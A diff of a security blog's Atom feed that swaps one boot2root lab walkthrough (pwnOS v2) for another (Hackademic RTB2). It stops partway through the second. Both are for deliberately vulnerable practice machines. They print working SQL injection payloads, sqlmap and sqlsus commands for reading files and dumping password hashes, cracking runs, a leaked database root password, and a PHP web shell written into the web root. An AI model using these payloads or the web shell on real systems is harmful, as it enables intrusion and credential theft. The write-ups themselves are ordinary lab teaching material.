@@ -4,7 +4,7 @@
   <title><![CDATA[Category: walkthrough | forelsec]]></title>
   <link href="http://hatRiot.github.io/blog/categories/walkthrough/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-05-13T23:34:25-06:00</updated>
+  <updated>2014-06-24T21:45:23-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -1203,314 +1203,822 @@ switch( pid = fork() ){
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[solving pwn0s v2]]></title>
-    <link href="http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2/"/>
-    <updated>2012-08-09T01:56:45-06:00</updated>
-    <id>http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2</id>
-    <content type="html"><![CDATA[<p>pwn0sv2 is version two in the pwn0s series (?), and can be found <a href="http://boot2root.info/">here</a> at our good friend g0tmi1k&rsquo;s pentest page.  I previously did a write up on the first version of pwn0s and enjoyed it, so I was excited to see there was another version available.  Forewarning: obvious spoilers.</p>
+    <title type="html"><![CDATA[Solving Hackademic-RTB2]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2/"/>
+    <updated>2012-11-18T01:24:24-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2</id>
+    <content type="html"><![CDATA[<p>Here&rsquo;s the second distro from mr. pr0n&rsquo;s realistic pentest discs.  This one was quite fun as I had almost zero experience with Joomla front ends, which so happens to be the entry point on this disc.  A little disappointed with the finale, but overall impressed with this disc.  With that, the iconic nmap:</p>
 
-<p>The zip comes packaged with a README with your standard disclaimer/info affair, along with the static IP.  10.10.10.100 is the set IP address.  I set my BT5 onto the 10.10.10.1/24 subnet and did a quick scan of the box:</p>
+<p>```</p>
 
-<p>```
-Starting Nmap 6.01 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2012-07-14 18:20 CDT
-Nmap scan report for 10.10.10.100
-Host is up (0.00086s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (protocol 2.0)
-| ssh-hostkey: 1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
-|<em>2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
-80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
+<h1>Nmap 6.01 scan initiated Wed Nov 14 16:45:09 2012 as: nmap -sS -p- -T5 -A -oN r2.scan 192.168.1.75</h1>
+
+<p>Nmap scan report for 192.168.1.75
+Host is up (0.00016s latency).
+Not shown: 65533 closed ports
+PORT    STATE    SERVICE VERSION
+80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
+|<em>http-title: Hackademic.RTB2
 |</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
-|_http-title: Welcome to this Site!
-MAC Address: 08:00:27:36:5C:EF (Cadmus Computer Systems)
+666/tcp filtered doom
+MAC Address: 08:00:27:E5:D1:B9 (Cadmus Computer Systems)
 Device type: general purpose
-Running: Linux 2.6.X|3.X
-OS CPE: cpe:/o:linux:kernel:2.6 cpe:/o:linux:kernel:3
-OS details: Linux 2.6.38 &ndash; 3.0
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:kernel</p>
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:kernel:2.6
+OS details: Linux 2.6.17 &ndash; 2.6.36, Linux 2.6.19 &ndash; 2.6.35
+Network Distance: 1 hop</p>
 
 <p>TRACEROUTE
 HOP RTT     ADDRESS
-1   0.86 ms 10.10.10.100
+1   0.16 ms 192.168.1.75</p>
+
+<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>
+
+<h1>Nmap done at Wed Nov 14 16:45:22 2012 &mdash; 1 IP address (1 host up) scanned in 13.36 seconds</h1>
+
+<p>```</p>
+
+<p>Much like the first one, we&rsquo;ve essentially just got an HTTP server.  Port 666 is tagged as Doom, but its likely there&rsquo;s something else on there.</p>
+
+<p><img src="/images/posts/2012/hrt2_1.jpg"></p>
+
+<p>There&rsquo;s the main page.  Doesn&rsquo;t look to be hosted on a web platform, and it doesn&rsquo;t appear to be vulnerable to any SQLi.  Running a few queries&hellip;</p>
+
+<p>```
+root@bt:/pentest/web/nikto# perl nikto.pl -host <a href="http://192.168.1.75">http://192.168.1.75</a></p>
+
+<h2>&ndash; Nikto v2.1.5</h2>
+
+<ul>
+<li>Target IP:          192.168.1.75</li>
+<li>Target Hostname:    192.168.1.75</li>
+<li>Target Port:        80
+
+<ul>
+<li>Start Time:         2012-11-15 18:41:46 (GMT-6)</li>
+</ul>
+</li>
+</ul>
+
+
+<hr />
+
+<ul>
+<li>Server: Apache/2.2.14 (Ubuntu)</li>
+<li>Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7</li>
+<li>Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.</li>
+<li>DEBUG HTTP verb may show server debugging information. See <a href="http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx">http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx</a> for details.</li>
+<li>OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
+<li>OSVDB-3268: /icons/: Directory indexing found.</li>
+<li>OSVDB-3233: /icons/README: Apache default file found.</li>
+<li>/phpmyadmin/: phpMyAdmin directory found</li>
+<li>6474 items checked: 0 error(s) and 8 item(s) reported on remote host
+
+<ul>
+<li>End Time:           2012-11-15 18:42:00 (GMT-6) (14 seconds)</li>
+</ul>
+</li>
+</ul>
+
+
+<hr />
+
+<ul>
+<li>1 host(s) tested
+root@bt:/pentest/web/nikto#
+```</li>
+</ul>
+
+
+<p><img src="/images/posts/2012/hrt2_2.jpg"></p>
+
+<p>There appears to be a phpMyAdmin not locked down, but it doesn&rsquo;t appear to be vulnerable to anything right off the bat.  Checking that 666 port again, connecting with netcat seems to dump out a bunch of HTML.  Weird; connecting now&hellip;</p>
+
+<p><img src="/images/posts/2012/hrt2_3.jpg"></p>
+
+<p>It appears that port 666 has some form of port knocking or filtering enabled.  It also appears to be hosted on Joomla 1.5.  <a href="http://cxsecurity.com/issue/WLB-2008080155">There&rsquo;s</a> an interesting SQLi for early 1.5 builds, but alas this one is already patched.  This is the part where I had to do a lot of googling; I&rsquo;ve only ever made cosmetic modifications to Joomla sites.  The gist of evaluating a Joomla box is enumeration of plugins/modules and platform vulnerabilities.  Plugins are typically found at <a href="http://site.com/index.php?option=com_MODULE.">http://site.com/index.php?option=com_MODULE.</a>  From there it&rsquo;s sqlmapping, exploit-db'ing (when it&rsquo;s available&hellip;), and googling.  Fortunately I stumbled upon a tool that tossed a lot of this toil into a simple package; NBS 0.3 Joomla Addon Attack Tool.  This came prepackaged with vulnerable plugin lists that evaluated their existence on the box as well as whether they were vulnerable or not.  The tool required a bit of tweaking on my part to account for the non-default port, but otherwise it worked well:</p>
+
+<p>```
+&ndash;=[ NBS 0.3 &ndash; Joomla Addon Attack Tool ]=&ndash;</p>
+
+<p>Make sure you write &lsquo;Yes&rsquo; or &lsquo;No&rsquo; without apostrophes.
+Do you wish to scan for addons? Yes or No: Yes</p>
+
+<p>&ndash;= Joomla Addon Vulnerability Scanner =&ndash;</p>
+
+<p>Example: <a href="http://www.domain.tld">http://www.domain.tld</a>
+[&ndash;] Enter a target to scan: <a href="http://192.168.1.75">http://192.168.1.75</a>
+[&ndash;] Enter the target port [80]: 666
+[<em>] Trying: index.php?option=com_jscalendar&amp;view=jscalendar&amp;task=details&amp;ev_id=
+[</em>] Trying: index.php?option=com_jedirectory&amp;view=item&amp;catid=
+[<em>] Trying: index.php?option=com_jejob&amp;view=item_detail&amp;itemid=
+[</em>] Trying: index.php?option=com_elite_experts&amp;task=showExpertProfileDetailed&amp;getExpertsFromCountry=&amp;language=ru&amp;id=
+[<em>] Trying: index.php?option=com_ezautos&amp;Itemid=49&amp;id=1&amp;task=helpers&amp;firstCode=
+[</em>] Trying: index.php?option=com_timetrack&amp;view=timetrack&amp;ct_id=
+[<em>] Trying: index.php?option=com_jgen&amp;task=view&amp;id=
+[</em>] Trying: index.php?option=com_zoomportfolio&amp;view=portfolio&amp;view=portfolio&amp;id=
+[<em>] Trying: index.php?option=com_fabrik&amp;view=table&amp;tableid=
+[</em>] Trying: index.php?option=com_zina&amp;view=zina&amp;Itemid=
+[<em>] Trying: index.php?option=com_ongallery&amp;task=ft&amp;id=
+[</em>] Trying: index.php?option=com_equipment&amp;view=details&amp;id=
+[<em>] Trying: index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[</em>] Addon Found: index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[+] This addon appears to be vulnerable!
+[+] Exploited with  index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[+] Full exploit string: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1+UNION+SELECT+load_file(&lsquo;/etc/passwd&rsquo;)
+root@bt:~/hackademicr2/nbs03#
 ```</p>
 
-<p>There&rsquo;s that pesky OpenSSH Debian build; we could try hunting for weak keys, but that looks to be a newer version of OpenSSH and likely not to be susceptible to that vulnerability.  Nonetheless, it may be worth keeping in mind as we move forward.  <a href="http://www.debian.org/security/2008/dsa-1571">Here&rsquo;s</a> a link to the old advisory for the curious.</p>
+<p>Just like that I knew the vulnerable plugin and the query string to exploit it.  This dumps:</p>
 
-<p>There also appears to be an HTTP website up.  Browsing around that gives us a couple of forms; /login.php and /register.php.  With so few services open, I&rsquo;m given the impression that this is going to be a web vulnerability.  First thing I do in almost every registration field:</p>
+<p><code>
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:107::/var/run/dbus:/bin/false avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false saned:x:112:118::/home/saned:/bin/false hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false p0wnbox:x:1000:1000:p0wnbox,,,:/home/p0wnbox:/bin/bash mysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false
+</code></p>
 
-<p><img class="center" src="/images/posts/2012/pwnos2_sqli.jpg"></p>
-
-<p>And low and behold, we&rsquo;re vulnerable to SQLi.  And away we go.</p>
-
-<p><img class="center" src="/images/posts/2012/pwnos2_sqli2.jpg"></p>
-
-<p>After playing around with the UNION SELECT&rsquo;s, it finally settled on 8 columns and 4 being the displayed one.  So <code>' UNION SELECT 1,2,3,user(), 4,5,6,7,8;-- -</code></p>
-
-<p>If you try that, you&rsquo;ll notice you can&rsquo;t actually stick the entire thing into the login box.  Busting Burp open will fix that:</p>
-
-<p><img class="center" src="/images/posts/2012/pwnos2_sqli3.jpg"></p>
-
-<p>Which gives us:</p>
-
-<p><img class="center" src="/images/posts/2012/pwnos2_sqli4.jpg"></p>
-
-<p>Fantastic!  This means that the mysql daemon is running as root user.  That makes our SQLi attacks much more dangerous; UDF is now available to us.  Lets explore the system a bit more.</p>
+<p>Playing around with sqlsus, we find:</p>
 
 <p>```
-&lsquo; UNION SELECT 1,2,3,version(),5,6,7,8&mdash; &ndash;</p>
+root@bt:/pentest/database/sqlsus# ./sqlsus hackr2.conf</p>
 
-<pre><code>  Welcome 5.1.54-1ubuntu4
+<pre><code>          sqlsus version 0.7.2
 </code></pre>
 
-<p>&lsquo; UNION SELECT 1,2,3,database(),5,6,7,8&mdash; &ndash;</p>
+<p>  Copyright &copy; 2008-2011 Jérémy Ruffet (sativouf)</p>
 
-<pre><code>  Welcome ch16
-</code></pre>
+<p>[+] Session &ldquo;192.168.1.75&rdquo; created
+sqlsus> start
+[+] Correct number of columns for UNION : 1 (1)
+[+] Length restriction on URL : 8200 bytes                    <br/>
+[+] Filling %target&hellip;
++&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| Variable | Value              |
++&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| database | joomla             |
+| user     | &lsquo;root&rsquo;@&lsquo;localhost&rsquo; |
+| version  | 5.1.41-3ubuntu12.8 |
++&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+3 rows in set</p>
 
-<p>&lsquo; UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8&mdash; &ndash;</p>
+<p>sqlsus>
+```</p>
 
-<pre><code>  An error occured(...)
-</code></pre>
-
-<p>```</p>
-
-<p>Looks like they&rsquo;re at the very least escaping slashes.  No problem:</p>
-
-<p>```</p>
-
-<blockquote><p>echo -n &lsquo;/etc/passwd&rsquo; | xxd -ps &ndash;
-2f6574632f706173737764
-&lsquo; UNION SELECT 1,2,3,load_file(0x2f6574632f706173737764),5,6,7,8&mdash; &ndash;
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-syslog:x:101:103::/home/syslog:/bin/false
-mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
-sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
-landscape:x:104:110::/var/lib/landscape:/bin/false
-dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
-echo -n &rsquo;/etc/shadow' | xxd -ps &ndash;
-2f6574632f736861646f77
-&lsquo; UNION SELECT 1,2,3,load_file(0x2f6574632f736861646f77),5,6,7,8&mdash; &ndash;
-Welcome
-```</p></blockquote>
-
-<p>Hm, looks like we can&rsquo;t hit /etc/shadow.  Weird.  Lets move on to rapidly enumerating the back end.  I switched over to sqlmap to give more info on the backend.  We already know the vulnerable form, we know the POST format (from our Burp session), and we know the database (from UNION queries above) so lets plug that in for some interesting stuff.</p>
-
-<p>```</p>
-
-<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=True&rsquo; -p &lsquo;email&rsquo; &mdash;tables -D &lsquo;ch16&rsquo;
-Database: ch16
-Table: users
-```</p></blockquote>
-
-<p>One table.  Let&rsquo;s check it out:</p>
-
-<p>```</p>
-
-<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;columns -T &lsquo;users&rsquo; &mdash;dump  <br/>
-```</p></blockquote>
-
-<p>This gave me a single user, &lsquo;Dan&rsquo;, with a user level 0 and his hash: <code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code></p>
-
-<p>I let sqlmap run its own cracker against the hash, then dumped it into oclHashCat:<br/>
-<code>cudaHashCat-plus64 -m 300 -a 3 -n 50 --gpu-watchdog=100 --force hash.txt ?l?l?l?l?l?l?l?l</code></p>
-
-<p>I then dumped database users to see what was there, and what the hashes were (assumed sha1(sha1(pass)), but you never know)</p>
-
-<p>```</p>
-
-<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;users
-database management system users [108]:</p>
-
-<pre><code>      [*] 'debian-sys-maint'@'localhost'
-      [*] 'root'@'127.0.0.1'
-      [*] 'root'@'localhost'
-      [*] 'root'@'web'
-</code></pre>
-
-<p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;passwords</p>
-
-<pre><code>      [23:11:18] [INFO] fetching database users password hashes
-      [23:11:18] [INFO] the SQL query used returns 4 entries
-      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
-      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
-      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
-      [23:11:18] [INFO] retrieved: "debian-sys-maint","*9366FE2112E650C8E5523AE337B10A625C727943" 
-</code></pre>
-
-<p>```</p></blockquote>
-
-<p>Pretty much what I expected.  At this point I figured the next best thing to try, with my root privileges and all, is UDF injection.  If you&rsquo;re unfamiliar with UDF&rsquo;s, here&rsquo;s a very brief breakdown: a user defined function is a way to extend the functionality of a database by providing a function that&rsquo;s able to be evaluated by the backend database server.  In our case, we want something akin to an eval() or exec().  This can be done with the lib_mysqludf_sys library.  If you want more information on UDF injection, read <a href="https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf">this</a> fantastic paper from BlackHat 2009 by Damele.</p>
-
-<p>Our attack method is then this: upload the precompiled library into the MySQL plugin directory, create our custom function, and execute some good stuff (passwd, addusr, whatever).  I first needed to know where the plugin directory was.  A quick <a href="https://dev.mysql.com/doc/refman/5.0/en/server-system-variables.html">google</a> of MySQL system variables gives us an answer:</p>
+<p>And for reference:</p>
 
 <p><code>
-' UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- -
-Welcome /usr/lib/mysql/plugin
+root@bt:/pentest/database/sqlsus# cat hackr2.conf | grep 192.168.1.75
+our $url_start = "http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1";
 </code></p>
 
-<p>Now we just need to write our library there and create the functions:</p>
-
-<p><code>
-python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE' -p 'email' --file-write=/lib_mysqludf_sys --file-dest=/usr/lib/mysql/plugin/
-CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
-SELECT * FROM information_schema.routines
-</code></p>
-
-<p>The final SELECT there does not return our newly created function.  According to MySQL documentation, we need INSERT privileges.  Do we have them?</p>
+<p>Looking up the Joomla 1.5 <a href="http://docs.joomla.org/Detailed_list_of_fields">database schema</a>, we find the users can be found in jos_users:</p>
 
 <p>```
-[*] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:</p>
+sqlsus> get columns jos_users
+[+] Getting columns names for joomla.jos_users
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+                                            <br/>
+| Columns in jos_users |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| id                   |
+| name                 |
+| username             |
+| email                |
+| password             |
+| usertype             |
+| block                |
+| sendemail            |
+| gid                  |
+| registerdate         |
+| lastvisitdate        |
+| activation           |
+| params               |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+13 rows in set</p>
 
-<pre><code>            privilege: ALTER
-            privilege: ALTER ROUTINE
-            privilege: CREATE
-            privilege: CREATE ROUTINE
-            privilege: CREATE TEMPORARY TABLES
-            privilege: CREATE USER
-            privilege: CREATE VIEW
-            privilege: DELETE
-            privilege: DROP
-            privilege: EVENT
-            privilege: EXECUTE
-            privilege: FILE
-            privilege: INDEX
-            privilege: INSERT
-            privilege: LOCK TABLES
-            privilege: PROCESS
-            privilege: REFERENCES
-            privilege: RELOAD
-            privilege: REPLICATION CLIENT
-            privilege: REPLICATION SLAVE
-            privilege: SELECT
-            privilege: SHOW DATABASES
-            privilege: SHOW VIEW
-            privilege: SHUTDOWN
-            privilege: SUPER
-            privilege: TRIGGER
-            privilege: UPDATE
+<p>sqlsus> select id,username,password,usertype from jos_users
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| id | username      | password                                                          | usertype            |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| 62 | Administrator | 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl | Super Administrator |
+| 63 | JSmith        | 992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF | Registered          |
+| 64 | BTallor       | abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy | Registered          |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+3 rows in set (2 hits)</p>
+
+<p>sqlsus>
+```</p>
+
+<p>These passwords are stored as md5(password + salt), so we need to load them up into Hashcat or john and let them run around.  As a note, I modified the hashes a bit to be in the form <code>username:md5$salt</code></p>
+
+<p><code>
+root@bt:/pentest/passwords/john# john --wordlist=/pentest/passwords/wordlists/rockyou.txt --form=dynamic_1 /root/hackademicr2/hashes.txt
+Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 SSE2 intrinsics 32x4x1])
+Remaining 1 password hash
+guesses: 0  time: 0:00:00:03 DONE (Thu Nov 15 23:03:45 2012)  c/s: 4333K  trying:   b1tch3s   -  * 7¡Vamos!
+root@bt:/pentest/passwords/john# cat john.pot
+$dynamic_1$992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF:matrix
+$dynamic_1$abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy:victim
+root@bt:/pentest/passwords/john#
+</code></p>
+
+<p>Well we got the two users, but no super admin.</p>
+
+<p>I handed the hash off for further cracking elsewhere, but lets again take a look at the results dirbuster turned up:</p>
+
+<p><img src="/images/posts/2012/hrt2_4.jpg"></p>
+
+<p>After more digging through Joomla documentation, turns out the &lsquo;configuration.php&rsquo; holds, surprise, Joomla site configurations, specifically..</p>
+
+<p><code>
+root@bt:/pentest/database/sqlmap# python sqlmap.py --url "http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1" -p 'catid' --dbms mysql --file-read="/var/www/configuration.php"
+[SNIP]
+root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_var_www_configuration.php
+&lt;?php
+class JConfig {
+/* Site Settings */
+var $offline = '0';
+var $offline_message = 'This site is down for maintenance.&lt;br /&gt; Please check back again soon.';
+var $sitename = 'Hackademic.RTB2';
+var $editor = 'tinymce';
+var $list_limit = '20';
+var $legacy = '0';
+/* Debug Settings */
+var $debug = '0';
+var $debug_lang = '0';
+/* Database Settings */
+var $dbtype = 'mysql';
+var $host = 'localhost';
+var $user = 'root';
+var $password = 'yUtJklM97W';
+var $db = 'joomla';
+var $dbprefix = 'jos_';
+/* Server Settings */
+var $live_site = '';
+var $secret = 'iFzlVUCg9BBPoUDU';
+var $gzip = '0';
+var $error_reporting = '-1';
+var $helpurl = 'http://help.joomla.org';
+var $xmlrpc_server = '0';
+var $ftp_host = '127.0.0.1';
+var $ftp_port = '21';
+var $ftp_user = '';
+var $ftp_pass = '';
+var $ftp_root = '';
+var $ftp_enable = '0';
+var $force_ssl = '0';
+[SNIP]
+</code></p>
+
+<p>Huzzah, root password hardcoded into the configuration file.  Note that this is only the MySQL root password, although its entirely possible that its also the system root password.  We know that there exists a phpMyAdmin listener, so lets log into that with our newfound credentials:</p>
+
+<p><img src="/images/posts/2012/hrt2_5.jpg"></p>
+
+<p>Now we&rsquo;ve got root on the database and access to the phpMyAdmin console.  From here, we can inject a backdoor that allows us to execute commands on the backend system.  This method was taken from <a href="http://www.securitytube.net/video/937">here</a>, though it&rsquo;s not exactly new.</p>
+
+<p>First we create a new table:
+<code>
+CREATE TABLE shell(
+ Sauce TEXT
+) ENGINE = MYISaM;
+</code></p>
+
+<p>Here we&rsquo;re creating a new table, shell, with a single text field, Sauce, as a MYISaM container (<a href="http://dev.mysql.com/doc/refman/5.0/en/myisam-storage-engine.html">more here</a>).  Next we&rsquo;ll insert the actual shell interpreter into the table:</p>
+
+<p><code>
+INSERT INTO shell
+VALUES(
+'&lt;pre&gt;&lt;? @system($_REQUEST["v"]); ?&gt;&lt;/pre&gt;'
+);
+</code></p>
+
+<p>Next we&rsquo;re going to need to dump to a php file for us to actually run with.  This can be done with the INTO DUMPFILE sql command, like so:</p>
+
+<p><code>
+SELECT *
+INTO DUMPFILE '/var/www/st.php'
+FROM shell;
+</code></p>
+
+<p>How do we know to hit /var/www?  By pulling the default apache2 config file of course:</p>
+
+<p>```
+root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url &ldquo;<a href="http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1">http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1</a>&rdquo; -p &lsquo;catid&rsquo; &mdash;dbms mysql &mdash;file-read=&lsquo;/etc/apache2/sites-available/default&rsquo;
+root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_etc_apache2_sites-available_default
+[SNIP]
+<VirtualHost *:666></p>
+
